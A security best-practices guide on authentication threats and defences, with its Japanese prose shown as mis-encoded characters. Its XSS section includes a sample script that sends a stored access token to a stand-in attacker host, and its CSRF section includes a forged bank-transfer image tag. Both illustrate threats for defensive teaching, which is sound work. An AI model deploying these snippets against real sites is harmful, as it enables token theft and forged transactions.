# ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¯¾ç­–ã¨ãƒ™ã‚¹ãƒˆãƒ—ãƒ©ã‚¯ãƒ†ã‚£ã‚¹

> **ğŸ›¡ï¸ èªè¨¼ãƒ»èªå¯ > ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¯¾ç­–**
> æœ¬ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã§ã¯ã€èªè¨¼å®Ÿè£…ã«ãŠã‘ã‚‹è„…å¨ã¨å¯¾ç­–ã€2025å¹´ã®ãƒ™ã‚¹ãƒˆãƒ—ãƒ©ã‚¯ãƒ†ã‚£ã‚¹ã‚’ã¾ã¨ã‚ã¦ã„ã¾ã™ã€‚XSSã€CSRFã€ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°ç­‰ã®å…¸å‹çš„ãªæ”»æ’ƒæ‰‹æ³•ã¨ã€ãã‚Œã‚‰ã«å¯¾ã™ã‚‹å…·ä½“çš„ãªå¯¾ç­–ã‚’è§£èª¬ã—ã¾ã™ã€‚

## å‰æçŸ¥è­˜

- **[æ¦‚è¦](auth-basics.md)** - èªè¨¼ãƒ»èªå¯ã®åŸºç¤
- **[OAuth 2.0 / OIDC](oauth-oidc-basics.md)** - ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã®è©³ç´°

## é–¢é€£ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆ

- å®Ÿè£…: **[å®Ÿè£…ã‚¬ã‚¤ãƒ‰](implementation-guide.md)** - ã‚»ã‚­ãƒ¥ã‚¢ãªå®Ÿè£…æ–¹æ³•
- è©³ç´°: **[åŒ…æ‹¬çš„ãƒªãƒ•ã‚¡ãƒ¬ãƒ³ã‚¹](authentication-guide.md)** - æœ€æ–°ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£æŠ€è¡“

---

## ç›®æ¬¡

1. [å…¸å‹çš„ãªè„…å¨ã¨å¯¾ç­–](#å…¸å‹çš„ãªè„…å¨ã¨å¯¾ç­–)
2. [ãƒˆãƒ¼ã‚¯ãƒ³ç®¡ç†ã®ãƒ™ã‚¹ãƒˆãƒ—ãƒ©ã‚¯ãƒ†ã‚£ã‚¹](#ãƒˆãƒ¼ã‚¯ãƒ³ç®¡ç†ã®ãƒ™ã‚¹ãƒˆãƒ—ãƒ©ã‚¯ãƒ†ã‚£ã‚¹)
3. [Cookie ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£è¨­å®š](#cookie-ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£è¨­å®š)
4. [æœ€æ–°ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£æŠ€è¡“](#æœ€æ–°ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£æŠ€è¡“)
5. [2025å¹´ã®é‡è¦ãƒˆãƒ”ãƒƒã‚¯](#2025å¹´ã®é‡è¦ãƒˆãƒ”ãƒƒã‚¯)

---

## å…¸å‹çš„ãªè„…å¨ã¨å¯¾ç­–

### 1. XSS(Cross-Site Scripting)

#### XSSã®æ”»æ’ƒå†…å®¹

æ‚ªæ„ã‚ã‚‹JavaScriptã‚’æ³¨å…¥ã—ã€ãƒˆãƒ¼ã‚¯ãƒ³ã‚„Cookieã‚’ç›—ã‚€ã€‚

```html
<!-- æ”»æ’ƒä¾‹ -->
<script>
  // LocalStorageã‹ã‚‰ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã‚€
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: localStorage.getItem('accessToken')
  });
</script>
```

#### XSSã®å¯¾ç­–

| å¯¾ç­– | èª¬æ˜ | å„ªå…ˆåº¦ |
|------|------|--------|
| **HttpOnly Cookie** | JavaScriptã‹ã‚‰ã‚¢ã‚¯ã‚»ã‚¹ä¸å¯ | ğŸ”´ å¿…é ˆ |
| **CSP** | Content Security Policyè¨­å®š | ğŸ”´ å¿…é ˆ |
| **å…¥åŠ›ã‚µãƒ‹ã‚¿ã‚¤ã‚º** | ãƒ¦ãƒ¼ã‚¶ãƒ¼å…¥åŠ›ã®ã‚¨ã‚¹ã‚±ãƒ¼ãƒ— | ğŸ”´ å¿…é ˆ |
| **Trusted Types** | DOMæ“ä½œã®å‹ãƒã‚§ãƒƒã‚¯ | ğŸŸ¡ æ¨å¥¨ |
| **ãƒˆãƒ¼ã‚¯ãƒ³ã¯ãƒ¡ãƒ¢ãƒªã®ã¿** | LocalStorageç¦æ­¢ | ğŸ”´ å¿…é ˆ |

**å®Ÿè£…ä¾‹**:

```javascript
// âŒ æ‚ªã„ä¾‹
localStorage.setItem('token', accessToken);

// âœ… è‰¯ã„ä¾‹1: HttpOnly Cookie(ã‚µãƒ¼ãƒãƒ¼å´è¨­å®š)
res.cookie('token', accessToken, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict'
});

// âœ… è‰¯ã„ä¾‹2: ãƒ¡ãƒ¢ãƒªã®ã¿(React Stateç­‰)
const [token, setToken] = useState(null);
```

**CSPè¨­å®šä¾‹**:

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-random123';
  object-src 'none'
```

---

### 2. CSRF(Cross-Site Request Forgery)

#### CSRFã®æ”»æ’ƒå†…å®¹

ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®æ„å›³ã—ãªã„ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã•ã›ã‚‹ã€‚

```html
<!-- æ”»æ’ƒè€…ã®ã‚µã‚¤ãƒˆ -->
<img src="https://bank.com/transfer?to=attacker&amount=10000">
<!-- ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒãƒ­ã‚°ã‚¤ãƒ³ä¸­ãªã‚‰ã€CookieãŒè‡ªå‹•é€ä¿¡ã•ã‚Œã‚‹ -->
```

#### CSRFã®å¯¾ç­–

| å¯¾ç­– | èª¬æ˜ | å„ªå…ˆåº¦ |
|------|------|--------|
| **SameSite Cookie** | ã‚¯ãƒ­ã‚¹ã‚µã‚¤ãƒˆãƒªã‚¯ã‚¨ã‚¹ãƒˆã§é€ä¿¡ã—ãªã„ | ğŸ”´ å¿…é ˆ |
| **CSRFãƒˆãƒ¼ã‚¯ãƒ³** | ãƒªã‚¯ã‚¨ã‚¹ãƒˆã”ã¨ã«ãƒˆãƒ¼ã‚¯ãƒ³æ¤œè¨¼ | ğŸ”´ å¿…é ˆ |
| **state ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿** | OAuthæ™‚ã®çŠ¶æ…‹æ¤œè¨¼ | ğŸ”´ å¿…é ˆ |
| **Origin/Refereræ¤œè¨¼** | ãƒªã‚¯ã‚¨ã‚¹ãƒˆå…ƒã®ç¢ºèª | ğŸŸ¡ æ¨å¥¨ |

**å®Ÿè£…ä¾‹**:

```javascript
// SameSite Cookie
Set-Cookie: session_id=xxx; SameSite=Strict; Secure; HttpOnly

// CSRFãƒˆãƒ¼ã‚¯ãƒ³
<meta name="csrf-token" content="{{ csrf_token }}">

fetch('/api/delete', {
  method: 'DELETE',
  headers: {
    'X-CSRF-Token': document.querySelector('meta[name="csrf-token"]').content
  }
});
```

---

### 3. ãƒˆãƒ¼ã‚¯ãƒ³çªƒå–ãƒ»ãƒªãƒ—ãƒ¬ã‚¤æ”»æ’ƒ

#### ãƒˆãƒ¼ã‚¯ãƒ³çªƒå–ãƒ»ãƒªãƒ—ãƒ¬ã‚¤ã®æ”»æ’ƒå†…å®¹

ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã‚“ã§ä¸æ­£åˆ©ç”¨ã€ã¾ãŸã¯éå»ã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’å†åˆ©ç”¨ã€‚

#### ãƒˆãƒ¼ã‚¯ãƒ³çªƒå–ãƒ»ãƒªãƒ—ãƒ¬ã‚¤ã®å¯¾ç­–

| å¯¾ç­– | èª¬æ˜ | å„ªå…ˆåº¦ |
|------|------|--------|
| **çŸ­å¯¿å‘½åŒ–** | ã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³15åˆ†ã€œ1æ™‚é–“ | ğŸ”´ å¿…é ˆ |
| **HTTPSå¿…é ˆ** | é€šä¿¡ã®æš—å·åŒ– | ğŸ”´ å¿…é ˆ |
| **DPoP** | ãƒˆãƒ¼ã‚¯ãƒ³ãƒã‚¤ãƒ³ãƒ‡ã‚£ãƒ³ã‚° | ğŸŸ¡ æ¨å¥¨ |
| **mTLS** | ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆè¨¼æ˜æ›¸èªè¨¼ | ğŸŸ¡ é«˜ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£æ™‚ |
| **nonce** | ãƒªãƒ—ãƒ¬ã‚¤æ”»æ’ƒé˜²æ­¢ | ğŸ”´ OIDCå¿…é ˆ |

**ãƒˆãƒ¼ã‚¯ãƒ³æœ‰åŠ¹æœŸé™(2025å¹´æ¨å¥¨)**:

```yaml
ã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³: 15åˆ†ã€œ1æ™‚é–“
IDãƒˆãƒ¼ã‚¯ãƒ³: 1æ™‚é–“
ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³: 7ã€œ30æ—¥
```

---

### 4. ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°æ”»æ’ƒ

#### ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°ã®æ”»æ’ƒå†…å®¹

å½ã®ãƒ­ã‚°ã‚¤ãƒ³ç”»é¢ã§ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’ç›—ã‚€ã€‚

#### ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°ã®å¯¾ç­–

| å¯¾ç­– | èª¬æ˜ | å„ªå…ˆåº¦ |
|------|------|--------|
| **WebAuthn/ãƒ‘ã‚¹ã‚­ãƒ¼** | ãƒ‰ãƒ¡ã‚¤ãƒ³ãƒã‚¤ãƒ³ãƒ‡ã‚£ãƒ³ã‚°ã§å½ã‚µã‚¤ãƒˆç„¡åŠ¹ | ğŸ”´ æœ€æ¨å¥¨ |
| **TOTP** | æ™‚é–“ãƒ™ãƒ¼ã‚¹ãƒ¯ãƒ³ã‚¿ã‚¤ãƒ ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ | ğŸŸ¡ æ¨å¥¨ |
| **ãƒªã‚¹ã‚¯ãƒ™ãƒ¼ã‚¹èªè¨¼** | ç•°å¸¸ãªã‚¢ã‚¯ã‚»ã‚¹ãƒ‘ã‚¿ãƒ¼ãƒ³æ¤œçŸ¥ | ğŸŸ¡ æ¨å¥¨ |
| **è¨¼æ˜æ›¸ã®ç¢ºèª** | SSL/TLSè¨¼æ˜æ›¸ã®æ­£å½“æ€§ | ğŸ”´ å¿…é ˆ |

**ãƒ‘ã‚¹ã‚­ãƒ¼ã®åˆ©ç‚¹**:

```javascript
// ãƒ‘ã‚¹ã‚­ãƒ¼ã¯ãƒ‰ãƒ¡ã‚¤ãƒ³ã«ç´ã¥ã
// å½ã‚µã‚¤ãƒˆ(phishing.com)ã§ã¯ä½¿ç”¨ä¸å¯
const credential = await navigator.credentials.get({
  publicKey: {
    challenge: challenge,
    rpId: "example.com"  // æ­£è¦ãƒ‰ãƒ¡ã‚¤ãƒ³ã®ã¿æœ‰åŠ¹
  }
});
```

---

### 5. ã‚»ãƒƒã‚·ãƒ§ãƒ³å›ºå®šåŒ–ãƒ»ä¹—ã£å–ã‚Š

#### ã‚»ãƒƒã‚·ãƒ§ãƒ³æ”»æ’ƒã®å†…å®¹

ä»–äººã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’ä¹—ã£å–ã‚‹ã€‚

#### ã‚»ãƒƒã‚·ãƒ§ãƒ³æ”»æ’ƒã®å¯¾ç­–

| å¯¾ç­– | èª¬æ˜ | å„ªå…ˆåº¦ |
|------|------|--------|
| **ãƒ­ã‚°ã‚¤ãƒ³æ™‚ã«IDå†ç”Ÿæˆ** | ã‚»ãƒƒã‚·ãƒ§ãƒ³å›ºå®šåŒ–å¯¾ç­– | ğŸ”´ å¿…é ˆ |
| **ãƒ‡ãƒã‚¤ã‚¹/IPæ¤œè¨¼** | ç•°å¸¸ãªã‚¢ã‚¯ã‚»ã‚¹æ¤œçŸ¥ | ğŸŸ¡ æ¨å¥¨ |
| **ã‚¢ã‚¯ãƒ†ã‚£ãƒ–ã‚»ãƒƒã‚·ãƒ§ãƒ³ç®¡ç†** | è¤‡æ•°ã‚»ãƒƒã‚·ãƒ§ãƒ³ã®å¯è¦–åŒ– | ğŸŸ¡ æ¨å¥¨ |
| **å¼·åˆ¶ãƒ­ã‚°ã‚¢ã‚¦ãƒˆ** | å…¨ãƒ‡ãƒã‚¤ã‚¹ã‹ã‚‰ãƒ­ã‚°ã‚¢ã‚¦ãƒˆæ©Ÿèƒ½ | ğŸŸ¡ æ¨å¥¨ |

**å®Ÿè£…ä¾‹**:

```javascript
// ãƒ­ã‚°ã‚¤ãƒ³æˆåŠŸæ™‚ã€ã‚»ãƒƒã‚·ãƒ§ãƒ³IDã‚’å†ç”Ÿæˆ
app.post('/login', (req, res) => {
  // èªè¨¼å‡¦ç†...

  req.session.regenerate((err) => {
    if (err) return res.status(500).send('Error');

    req.session.userId = user.id;
    res.send('Login successful');
  });
});
```

---

### 6. OAuth ç‰¹æœ‰ã®æ”»æ’ƒ

#### èªå¯ã‚³ãƒ¼ãƒ‰æ¨ªå–ã‚Šæ”»æ’ƒ

**å¯¾ç­–**: PKCEå¿…é ˆ

#### ãƒŸãƒƒã‚¯ã‚¹ã‚¢ãƒƒãƒ—æ”»æ’ƒ

**å¯¾ç­–**: issueræ¤œè¨¼ã€JARM

#### ã‚ªãƒ¼ãƒ—ãƒ³ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ã‚¿

**å¯¾ç­–**: ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆURIå®Œå…¨ä¸€è‡´

---

## ãƒˆãƒ¼ã‚¯ãƒ³ç®¡ç†ã®ãƒ™ã‚¹ãƒˆãƒ—ãƒ©ã‚¯ãƒ†ã‚£ã‚¹

### ãƒˆãƒ¼ã‚¯ãƒ³ä¿å­˜å ´æ‰€ã®é¸æŠ(2025å¹´ç‰ˆ)

| ä¿å­˜å ´æ‰€ | XSSè€æ€§ | CSRFè€æ€§ | æ°¸ç¶šæ€§ | æ¨å¥¨åº¦ | ç”¨é€” |
|---------|---------|----------|--------|--------|------|
| **BFF ã‚µãƒ¼ãƒãƒ¼å´** | âœ… é«˜ | âœ… é«˜ | âœ… ã‚ã‚Š | ğŸŒŸ æœ€æ¨å¥¨ | ã™ã¹ã¦ |
| **HttpOnly Cookie** | âœ… é«˜ | âš ï¸ è¦å¯¾ç­– | âœ… ã‚ã‚Š | âœ… æ¨å¥¨ | ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³ |
| **ãƒ¡ãƒ¢ãƒª(State)** | âœ… é«˜ | âœ… é«˜ | âŒ ãªã— | âœ… æ¨å¥¨ | ã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ |
| SessionStorage | âŒ ä½ | âœ… é«˜ | âŒ ãªã— | âš ï¸ æ¡ä»¶ä»˜ã | ä¸€æ™‚çš„ãªãƒ‡ãƒ¼ã‚¿ |
| LocalStorage | âŒ ä½ | âœ… é«˜ | âœ… ã‚ã‚Š | âŒ **ç¦æ­¢** | ãªã— |

### ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³ãƒ­ãƒ¼ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³

**ä½¿ã„æ¨ã¦æˆ¦ç•¥ã§ã€å†åˆ©ç”¨ã‚’æ¤œçŸ¥ã€‚**

```javascript
// ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆå´
const refreshAccessToken = async (oldRefreshToken) => {
  const res = await fetch('/auth/refresh', {
    method: 'POST',
    body: JSON.stringify({ refreshToken: oldRefreshToken })
  });

  const { accessToken, refreshToken } = await res.json();

  // æ–°ã—ã„ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³ã§ç½®ãæ›ãˆ
  return { accessToken, refreshToken };
};

// ã‚µãƒ¼ãƒãƒ¼å´
app.post('/auth/refresh', (req, res) => {
  const { refreshToken } = req.body;

  // å†åˆ©ç”¨æ¤œçŸ¥
  if (isTokenAlreadyUsed(refreshToken)) {
    // ãƒˆãƒ¼ã‚¯ãƒ³ãƒ•ã‚¡ãƒŸãƒªãƒ¼å…¨ä½“ã‚’ç„¡åŠ¹åŒ–
    revokeAllTokensForUser(getUserId(refreshToken));
    return res.status(401).send('Token reuse detected');
  }

  // ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä½¿ç”¨æ¸ˆã¿ã¨ã—ã¦ãƒãƒ¼ã‚¯
  markTokenAsUsed(refreshToken);

  // æ–°ã—ã„ãƒˆãƒ¼ã‚¯ãƒ³ãƒšã‚¢ã‚’ç™ºè¡Œ
  const newAccessToken = generateAccessToken();
  const newRefreshToken = generateRefreshToken();

  res.json({
    accessToken: newAccessToken,
    refreshToken: newRefreshToken
  });
});
```

---

## Cookie ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£è¨­å®š

### å¿…é ˆå±æ€§(2025å¹´ç‰ˆ)

```javascript
// Express.js
res.cookie('session_id', sessionId, {
  httpOnly: true,    // JavaScriptã‹ã‚‰ã‚¢ã‚¯ã‚»ã‚¹ä¸å¯(XSSå¯¾ç­–)
  secure: true,      // HTTPSé€šä¿¡ã®ã¿
  sameSite: 'strict', // ã‚¯ãƒ­ã‚¹ã‚µã‚¤ãƒˆãƒªã‚¯ã‚¨ã‚¹ãƒˆã§é€ä¿¡ã—ãªã„(CSRFå¯¾ç­–)
  maxAge: 3600000,   // æœ‰åŠ¹æœŸé™(1æ™‚é–“)
  path: '/',         // æœ‰åŠ¹ãƒ‘ã‚¹
  domain: 'example.com' // ãƒ‰ãƒ¡ã‚¤ãƒ³æŒ‡å®š(ã‚ªãƒ—ã‚·ãƒ§ãƒ³)
});
```

### SameSiteå±æ€§ã®è©³ç´°

| å€¤ | å‹•ä½œ | ç”¨é€” |
|----|----|------|
| **Strict** | ã‚¯ãƒ­ã‚¹ã‚µã‚¤ãƒˆãƒªã‚¯ã‚¨ã‚¹ãƒˆã§ä¸€åˆ‡é€ä¿¡ã—ãªã„ | æœ€ã‚‚å®‰å…¨ã€ãŸã ã—å¤–éƒ¨ãƒªãƒ³ã‚¯ã‹ã‚‰ã®ã‚¢ã‚¯ã‚»ã‚¹ã§å†ãƒ­ã‚°ã‚¤ãƒ³å¿…è¦ |
| **Lax** | GETç­‰ã®å®‰å…¨ãªãƒ¡ã‚½ãƒƒãƒ‰ã§ã¯é€ä¿¡ | ãƒãƒ©ãƒ³ã‚¹ãŒè‰¯ã„ã€é€šå¸¸ã®ã‚µã‚¤ãƒˆå‘ã‘ |
| **None** | å¸¸ã«é€ä¿¡(Secureå¿…é ˆ) | ã‚µãƒ¼ãƒ‰ãƒ‘ãƒ¼ãƒ†ã‚£Cookieã€åŸ‹ã‚è¾¼ã¿ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ |

**æ¨å¥¨è¨­å®š**:

```javascript
// ä¸€èˆ¬çš„ãªWebã‚¢ãƒ—ãƒª
sameSite: 'lax'

// é«˜ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãŒå¿…è¦ãªå ´åˆ
sameSite: 'strict'

// åŸ‹ã‚è¾¼ã¿ã‚³ãƒ³ãƒ†ãƒ³ãƒ„(iframeç­‰)
sameSite: 'none'  // âš ï¸ ã‚µãƒ¼ãƒ‰ãƒ‘ãƒ¼ãƒ†ã‚£Cookieå»ƒæ­¢ã§å°†æ¥çš„ã«ä½¿ç”¨ä¸å¯
```

---

## æœ€æ–°ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£æŠ€è¡“

### 1. DPoP(Demonstrating Proof-of-Possession)

**ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã®ç§˜å¯†éµã«ãƒã‚¤ãƒ³ãƒ‰ã€‚**

```javascript
// 1. ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆãŒéµãƒšã‚¢ã‚’ç”Ÿæˆ
const keyPair = await crypto.subtle.generateKey(
  { name: "ECDSA", namedCurve: "P-256" },
  true,
  ["sign", "verify"]
);

// 2. DPoP Proofã‚’ç”Ÿæˆ
const dpopProof = await createDPoPProof({
  method: 'GET',
  url: 'https://api.example.com/users',
  accessToken: accessToken,
  privateKey: keyPair.privateKey
});

// 3. APIãƒªã‚¯ã‚¨ã‚¹ãƒˆ
fetch('https://api.example.com/users', {
  headers: {
    'Authorization': `DPoP ${accessToken}`,
    'DPoP': dpopProof
  }
});
```

**ãƒ¡ãƒªãƒƒãƒˆ**:

- âœ… ãƒˆãƒ¼ã‚¯ãƒ³ãŒç›—ã¾ã‚Œã¦ã‚‚ç§˜å¯†éµãªã—ã§ã¯ä½¿ç”¨ä¸å¯
- âœ… ä¸­é–“è€…æ”»æ’ƒã¸ã®è€æ€§

---

### 2. PAR(Pushed Authorization Requests)

**èªå¯ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’äº‹å‰ã«ã‚µãƒ¼ãƒãƒ¼ã¸ãƒ—ãƒƒã‚·ãƒ¥ã€‚**

```mermaid
sequenceDiagram
    participant Client
    participant AS as èªå¯ã‚µãƒ¼ãƒãƒ¼

    Client->>AS: POST /par (èªå¯ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿)
    AS->>Client: request_uri
    Client->>AS: GET /authorize?request_uri=xxx
    AS->>Client: èªå¯ã‚³ãƒ¼ãƒ‰
```

**ãƒ¡ãƒªãƒƒãƒˆ**:

- âœ… URLãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿æ”¹ã–ã‚“é˜²æ­¢
- âœ… ãƒ–ãƒ©ã‚¦ã‚¶å±¥æ­´ã‹ã‚‰ã®æƒ…å ±æ¼ãˆã„é˜²æ­¢

---

### 3. FAPI(Financial-grade API)

**é‡‘èæ¥­ç•Œå‘ã‘ã®å³æ ¼ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ—ãƒ­ãƒ•ã‚¡ã‚¤ãƒ«ã€‚**

è¦ä»¶:

- âœ… PARå¿…é ˆ
- âœ… mTLS ã¾ãŸã¯ DPoP
- âœ… çŸ­å¯¿å‘½ãƒˆãƒ¼ã‚¯ãƒ³(10åˆ†ä»¥ä¸‹æ¨å¥¨)
- âœ… JAR/JARM

---

## 2025å¹´ã®é‡è¦ãƒˆãƒ”ãƒƒã‚¯

### ã‚µãƒ¼ãƒ‰ãƒ‘ãƒ¼ãƒ†ã‚£Cookie ã®æ®µéšçš„å»ƒæ­¢

#### å½±éŸ¿

- âŒ å¾“æ¥ã®ã‚µã‚¤ãƒ¬ãƒ³ãƒˆãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥(éš ã—iframe)ãŒä½¿ç”¨ä¸å¯
- âŒ IdPã®ã‚µãƒ¼ãƒ‰ãƒ‘ãƒ¼ãƒ†ã‚£Cookieä¾å­˜SSOãŒå›°é›£

#### ã‚µãƒ¼ãƒ‰ãƒ‘ãƒ¼ãƒ†ã‚£Cookieå¯¾ç­–

##### 1. BFFãƒ‘ã‚¿ãƒ¼ãƒ³(æœ€æ¨å¥¨)

```mermaid
graph LR
    Browser -->|1st Party Cookie| BFF
    BFF -->|OAuth Token| IdP
    BFF -->|API Call| Backend
```

- âœ… ãƒˆãƒ¼ã‚¯ãƒ³ã‚’BFFã‚µãƒ¼ãƒãƒ¼å´ã§ç®¡ç†
- âœ… ãƒ–ãƒ©ã‚¦ã‚¶ã¨ã¯ãƒ•ã‚¡ãƒ¼ã‚¹ãƒˆãƒ‘ãƒ¼ãƒ†ã‚£Cookieã®ã¿

##### 2. FedCM(Federated Credential Management)

```javascript
// FedCM API(Chromeæœ¬æ ¼å°å…¥æ¸ˆã¿)
const credential = await navigator.credentials.get({
  identity: {
    providers: [{
      configURL: "https://idp.example/fedcm.json",
      clientId: "your-client-id"
    }]
  }
});
```

---

### WebAuthn / ãƒ‘ã‚¹ã‚­ãƒ¼ ã®æ™®åŠ

**2025å¹´ã€ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒ¬ã‚¹èªè¨¼ãŒä¸»æµåŒ–ã€‚**

#### ç™»éŒ²

```javascript
const credential = await navigator.credentials.create({
  publicKey: {
    challenge: new Uint8Array(32),
    rp: { name: "Example Corp", id: "example.com" },
    user: {
      id: new Uint8Array(16),
      name: "user@example.com",
      displayName: "User Name"
    },
    pubKeyCredParams: [
      { type: "public-key", alg: -7 }  // ES256
    ],
    authenticatorSelection: {
      authenticatorAttachment: "platform",  // ãƒ‡ãƒã‚¤ã‚¹å†…è”µèªè¨¼å™¨
      userVerification: "required"
    }
  }
});
```

#### èªè¨¼

```javascript
const assertion = await navigator.credentials.get({
  publicKey: {
    challenge: new Uint8Array(32),
    rpId: "example.com"
  }
});
```

**ãƒ¡ãƒªãƒƒãƒˆ**:

- âœ… ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°è€æ€§(ãƒ‰ãƒ¡ã‚¤ãƒ³ãƒã‚¤ãƒ³ãƒ‡ã‚£ãƒ³ã‚°)
- âœ… ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ä¸è¦
- âœ… ç”Ÿä½“èªè¨¼ã§ä¾¿åˆ©
- âœ… ã‚¯ãƒ­ã‚¹ãƒ‡ãƒã‚¤ã‚¹åŒæœŸå¯èƒ½

---

## ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒã‚§ãƒƒã‚¯ãƒªã‚¹ãƒˆ

### ãƒ•ãƒ­ãƒ³ãƒˆã‚¨ãƒ³ãƒ‰(Next.jsç­‰)

- [ ] ãƒˆãƒ¼ã‚¯ãƒ³ã‚’LocalStorageã«ä¿å­˜ã—ã¦ã„ãªã„
- [ ] HttpOnly Cookie ã¾ãŸã¯ BFF ã§ãƒˆãƒ¼ã‚¯ãƒ³ç®¡ç†
- [ ] CSP(Content Security Policy)è¨­å®šæ¸ˆã¿
- [ ] HTTPSå¼·åˆ¶
- [ ] state/nonce ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ä½¿ç”¨
- [ ] PKCEæœ‰åŠ¹åŒ–
- [ ] å…¥åŠ›å€¤ã®ã‚µãƒ‹ã‚¿ã‚¤ã‚ºãƒ»ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—
- [ ] ä¾å­˜é–¢ä¿‚ã®å®šæœŸæ›´æ–°(npm audit)

### ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰(Spring Bootç­‰)

- [ ] JWTç½²åæ¤œè¨¼
- [ ] issuer/audience/exp æ¤œè¨¼
- [ ] CORSé©åˆ‡ã«è¨­å®š(ãƒ¯ã‚¤ãƒ«ãƒ‰ã‚«ãƒ¼ãƒ‰ç¦æ­¢)
- [ ] ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ˜ãƒƒãƒ€ãƒ¼è¨­å®š
- [ ] APIãƒ¬ãƒ¼ãƒˆåˆ¶é™
- [ ] å…¥åŠ›å€¤ãƒãƒªãƒ‡ãƒ¼ã‚·ãƒ§ãƒ³
- [ ] SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³å¯¾ç­–
- [ ] ãƒ­ã‚°ãƒ»ç›£æŸ»è¨¼è·¡

### IdP(AWS Cognitoç­‰)

- [ ] å¼·åŠ›ãªãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒãƒªã‚·ãƒ¼(12æ–‡å­—ä»¥ä¸Š)
- [ ] MFAæœ‰åŠ¹åŒ–
- [ ] Advanced Security Featuresæœ‰åŠ¹
- [ ] ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆURIå³æ ¼ä¸€è‡´
- [ ] ãƒˆãƒ¼ã‚¯ãƒ³æœ‰åŠ¹æœŸé™é©åˆ‡
- [ ] ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³ãƒ­ãƒ¼ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³

### é‹ç”¨

- [ ] ç•°å¸¸ãƒ­ã‚°ã‚¤ãƒ³æ¤œçŸ¥
- [ ] ã‚¢ã‚¯ãƒ†ã‚£ãƒ–ã‚»ãƒƒã‚·ãƒ§ãƒ³ç®¡ç†
- [ ] å¼·åˆ¶ãƒ­ã‚°ã‚¢ã‚¦ãƒˆæ©Ÿèƒ½
- [ ] ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚¤ãƒ³ã‚·ãƒ‡ãƒ³ãƒˆå¯¾å¿œè¨ˆç”»
- [ ] å®šæœŸçš„ãªè„†å¼±æ€§è¨ºæ–­
- [ ] ãƒšãƒãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆ

---

## ã¾ã¨ã‚

### 2025å¹´ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¸‰åŸå‰‡

